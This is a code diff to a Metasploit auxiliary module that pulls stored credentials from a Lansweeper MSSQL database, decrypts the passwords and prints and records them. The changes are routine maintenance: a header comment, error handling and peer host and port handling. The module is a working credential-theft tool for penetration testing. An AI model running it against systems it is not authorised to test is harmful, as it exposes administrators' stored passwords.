@@ -1,4 +1,7 @@
-require 'msf/core'
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::MSSQL
@@ -37,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       OptString.new('DATABASE', [true, 'The Lansweeper database', 'lansweeperdb'])
-    ], self.class)
+    ])
 
   end
 
@@ -112,7 +115,7 @@ class MetasploitModule < Msf::Auxiliary
       address: opts[:host],
       port: opts[:port],
       protocol: 'tcp',
-      workspace_id: myworkspace.id,
+      workspace_id: myworkspace_id,
       service_name: opts[:creds_name]
     }
 
@@ -138,14 +141,19 @@ class MetasploitModule < Msf::Auxiliary
     end
     result = mssql_query("select Credname, Username, Password from #{datastore['DATABASE']}.dbo.tsysCredentials WHERE LEN(Password)>64", false)
 
+    if result[:errors]
+      print_error("SQL Query returned error: #{result[:errors].first}")
+      return
+    end
+
     result[:rows].each do |row|""
       pw = lsw_decrypt(row[2])
 
       print_good("Credential name: #{row[0]} | username: #{row[1]} | password: #{pw}")
 
       report_cred(
-        :host => rhost,
-        :port => rport,
+        :host => mssql_client.peerhost,
+        :port => mssql_client.peerport,
         :creds_name => row[0],
         :user => row[1],
         :password => pw
